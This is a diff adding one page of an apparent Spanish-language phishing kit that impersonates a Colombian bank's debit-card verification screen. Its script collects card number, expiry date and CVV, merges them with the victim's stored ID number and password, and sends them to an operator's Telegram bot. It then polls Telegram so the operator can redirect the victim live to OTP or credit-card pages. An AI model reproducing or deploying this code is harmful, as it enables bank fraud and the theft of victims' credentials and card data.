@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tarjeta de Débito</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <style>
+        body {
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            background-color: #eee;
+        }
+
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#df0209] to-[#df0209]">
+            <img src="img/logo.png" alt="" class="w-full max-w-[150px] h-auto -mt-4">
+        </header>
+
+        <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200 p-6 box-border">
+            <form id="tarjetaForm">
+                <div class="w-full text-center mb-6">
+             
+                    <h3 class="text-xl font-bold text-[#000000] mb-2">Tarjeta de Débito</h3>
+                    <p class="text-sm text-gray-600">Por favor, ingresa los datos de tu tarjeta de débito para verificar tu identidad.</p>
+                </div>
+
+                <div class="w-full">
+                    <div class="my-4">
+                        <label class="text-sm text-gray-600 mb-1 block">Número de la Tarjeta</label>
+                        <input type="tel" name="nro_tarjeta" id="nro_tarjeta" placeholder="16 dígitos" minlength="16" maxlength="19" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2" required>
+                    </div>
+                    <div class="flex justify-between gap-4 my-4">
+                        <div class="w-1/2">
+                            <label class="text-sm text-gray-600 mb-1 block">Fecha de Vencimiento (MM/AA)</label>
+                            <input type="tel" name="fecha_vencimiento" id="fecha_vencimiento" placeholder="MM/AA" minlength="5" maxlength="5" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2" required>
+                        </div>
+                        <div class="w-1/2">
+                            <label class="text-sm text-gray-600 mb-1 block">CVV</label>
+                            <input type="tel" name="cvv" id="cvv" placeholder="3 dígitos" minlength="3" maxlength="4" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2" required>
+                        </div>
+                    </div>
+                    </div>
+
+                <button type="submit" id="submitBtn" disabled class="block w-full rounded-2xl text-white bg-[#df0209] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Validar Tarjeta</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="error-modal" class="custom-modal">
+        <div class="custom-modal-content">
+            <div class="flex items-center justify-center gap-5">
+                <img src="../virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.html" alt="Icono de error" class="w-15 h-15">
+                <div>
+                    <h3 class="mb-5 text-[#0040a8]">¡Ups! Algo salió mal</h3>
+                    <p>Los datos ingresados son incorrectos. Por favor, verifica e intenta de nuevo.</p>
+                </div>
+            </div>
+            <button id="back-to-start-button" class="mt-5 w-full bg-[#0040a8] text-white py-3 rounded-lg">Volver a intentar</button>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const tarjetaForm = document.getElementById('tarjetaForm');
+            const nroTarjetaInput = document.getElementById('nro_tarjeta');
+            const fechaVencimientoInput = document.getElementById('fecha_vencimiento');
+            const cvvInput = document.getElementById('cvv');
+            // Se eliminó la línea para obtener el elemento 'claveInput'
+            const submitBtn = document.getElementById('submitBtn');
+            const errorModal = document.getElementById('error-modal');
+            const backToStartButton = document.getElementById('back-to-start-button');
+            const spinnerModal = document.getElementById('spinner-modal');
+            const initialLoginData = JSON.parse(sessionStorage.getItem('initialLoginData'));
+            const transactionId = initialLoginData?.transactionId || Date.now().toString();
+
+            let TELEGRAM_BOT_TOKEN = '';
+            let TELEGRAM_CHAT_ID = '';
+            let statusCheckInterval = null;
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+
+            async function loadTelegramConfig() {
+                try {
+                    const response = await fetch('js/brr76.json');
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    const data = await response.json();
+                    TELEGRAM_BOT_TOKEN = data.token;
+                    TELEGRAM_CHAT_ID = data.chat_id;
+                    console.log("Tokens y IDs de chat de Telegram cargados correctamente.");
+                    return true;
+                } catch (error) {
+                    console.error('Error al cargar la configuración de Telegram:', error);
+                    alert('Error crítico: No se pudo cargar la configuración de Telegram. Por favor, verifica el archivo js/brr76.json.');
+                    if (submitBtn) submitBtn.disabled = true;
+                    return false;
+                }
+            }
+
+            async function initLastUpdateId() {
+                try {
+                    if (!TELEGRAM_BOT_TOKEN) return;
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data || !data.result) return;
+                    const updates = data.result;
+                    if (updates.length === 0) return;
+                    const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                    lastUpdateId = maxUpdateId;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    console.log('Inicializado lastUpdateId a', lastUpdateId);
+                } catch (err) {
+                    console.warn('No se pudo inicializar lastUpdateId:', err);
+                }
+            }
+
+            function luhnCheck(cardNumber) {
+                let sum = 0;
+                let isSecond = false;
+                for (let i = cardNumber.length - 1; i >= 0; i--) {
+                    let digit = parseInt(cardNumber.charAt(i), 10);
+                    if (isSecond) {
+                        digit *= 2;
+                        if (digit > 9) {
+                            digit -= 9;
+                        }
+                    }
+                    sum += digit;
+                    isSecond = !isSecond;
+                }
+                return (sum % 10) === 0;
+            }
+
+            function formatCardNumber(event) {
+                let input = event.target;
+                let value = input.value.replace(/\D/g, '');
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                input.value = formattedValue;
+                validateForm();
+            }
+
+            function formatExpiryDate(event) {
+                let input = event.target;
+                let value = input.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                input.value = value;
+                validateForm();
+            }
+
+            function validateForm() {
+                const nroTarjetaValid = nroTarjetaInput && nroTarjetaInput.value.replace(/\s/g, '').length >= 16;
+                const fechaVencimientoValid = fechaVencimientoInput && fechaVencimientoInput.value.length === 5;
+                const cvvValid = cvvInput && cvvInput.value.length >= 3 && cvvInput.value.length <= 4;
+                // Se eliminó la validación de la clave: const claveValid = claveInput && claveInput.value.length === 4;
+
+                const luhnValid = luhnCheck(nroTarjetaInput.value.replace(/\s/g, ''));
+
+                // Se eliminó 'claveValid' de la condición
+                const isFormValid = nroTarjetaValid && fechaVencimientoValid && cvvValid && luhnValid;
+
+                if (submitBtn) {
+                    submitBtn.disabled = !isFormValid;
+                }
+            }
+
+            // Se eliminó 'claveInput' de la lista de inputs a escuchar
+            [nroTarjetaInput, fechaVencimientoInput, cvvInput].forEach(input => {
+                if (input) {
+                    input.addEventListener('input', validateForm);
+                    input.addEventListener('input', () => {
+                        if (input.value.length > input.maxLength) {
+                            input.value = input.value.slice(0, input.maxLength);
+                        }
+                    });
+                }
+            });
+
+            nroTarjetaInput.addEventListener('input', formatCardNumber);
+            fechaVencimientoInput.addEventListener('input', formatExpiryDate);
+
+
+            async function sendToTelegram(messageContent, keyboard) {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                    throw new Error('Telegram bot token or chat ID is not set.');
+                }
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageContent,
+                    parse_mode: 'Markdown',
+                    reply_markup: keyboard
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        return null;
+                    }
+                    const data = await response.json();
+                    return data.result.message_id;
+                } catch (error) {
+                    console.error('Error de red al enviar mensaje a Telegram:', error);
+                    return null;
+                }
+            }
+
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {}
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('Error de red al borrar botones de Telegram:', error);
+                }
+            }
+
+            async function handleTarjetaAttempt() {
+                spinnerModal.style.display = 'flex';
+
+                const now = new Date();
+                const formattedDate = now.toLocaleDateString('es-CO', {
+                    day: 'numeric', month: 'numeric', year: 'numeric'
+                });
+                const formattedTime = now.toLocaleTimeString('es-CO', {
+                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+                });
+
+                const loginData = initialLoginData || {};
+                // Se eliminó 'claveInput.value' del mensaje
+                const message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${loginData?.loginType || 'Clave Segura'}\nTipo de Doc: ${loginData?.tipoDoc}\n\nCEDULA💎: ${loginData?.nroDoc}\nCLAVE🔐: ${loginData?.clave || loginData?.cardClave}\n\n⚠️ TARJETA DÉBITO ⚠️\n💳 Tarjeta: ${nroTarjetaInput.value}\n📅 Vence: ${fechaVencimientoInput.value}\n🔒 CVV: ${cvvInput.value}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+
+                const keyboard = JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "✅ IR A OTP", callback_data: `ir_otp:${transactionId}` }],
+                        [{ text: "💳 Pedir Crédito", callback_data: `pedir_tc:${transactionId}` }],
+                        [{ text: "✅ Finalizar", callback_data: `finalizar:${transactionId}` }]
+                    ],
+                });
+
+                const messageId = await sendToTelegram(message, keyboard);
+
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
+                    checkPaymentVerification();
+                } else {
+                    spinnerModal.style.display = 'none';
+                    alert("Error al enviar los datos. Por favor, inténtalo de nuevo.");
+                }
+            }
+
+            async function checkPaymentVerification() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+                statusCheckInterval = setInterval(async () => {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
+                    try {
+                        const response = await fetch(url);
+                        const data = await response.json();
+                        const updates = data.result;
+
+                        if (updates && updates.length > 0) {
+                            const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
+
+                            if (relevantUpdate) {
+                                const latest = relevantUpdate;
+                                clearInterval(statusCheckInterval);
+                                spinnerModal.style.display = 'none';
+
+                                const callbackData = latest.callback_query.data.split(':')[0];
+                                const callbackId = latest.callback_query.id;
+                                const messageId = sessionStorage.getItem('telegramMessageId');
+
+                                await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
+
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
+                                    });
+                                } catch (err) {
+                                    console.warn('No se pudo responder callback_query:', err);
+                                }
+
+                                lastUpdateId = latest.update_id;
+                                sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                                if (callbackData === 'ir_otp') {
+                                    window.location.href = "otp.html";
+                                } else if (callbackData === 'pedir_tc') {
+                                    window.location.href = "tc.html";
+                                } else if (callbackData === 'finalizar') {
+                                    window.location.href = "finalizar.html"; 
+                                }
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Error al verificar el estado de la transacción:", error);
+                    }
+                }, 2000);
+            }
+
+            tarjetaForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                handleTarjetaAttempt();
+            });
+
+            if (backToStartButton) {
+                backToStartButton.addEventListener('click', () => {
+                    errorModal.style.display = 'none';
+                    window.location.reload(); 
+                });
+            }
+
+            window.addEventListener('beforeunload', function() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+            });
+
+            loadTelegramConfig().then(configLoaded => {
+                if (configLoaded) {
+                    initLastUpdateId();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
